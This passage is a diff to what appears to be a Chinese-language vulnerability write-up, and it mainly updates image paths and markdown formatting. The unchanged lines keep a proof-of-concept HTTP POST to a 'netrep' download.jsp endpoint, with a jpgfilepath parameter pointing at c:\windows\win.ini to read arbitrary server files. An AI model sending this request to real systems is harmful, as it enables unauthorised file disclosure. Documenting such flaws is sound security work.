@@ -20,17 +20,11 @@ body="/netrep/"
 
 登录路径如下
 
-
-
-![](images/202202101905343.png)
-
-
+![](../.gitbook/assets/202202101905343.png)
 
 发送请求包
 
-
-
-```plain
+```
 POST /netrep/ebook/browse/download.jsp HTTP/1.1
 Host: 
 Content-Length: 55
@@ -42,6 +36,4 @@ Content-Type: application/x-www-form-urlencoded
 jpgfilepath=c:\windows\win.ini
 ```
 
-
-
-![](images/202202101905484.png)
+![](../.gitbook/assets/202202101905484.png)
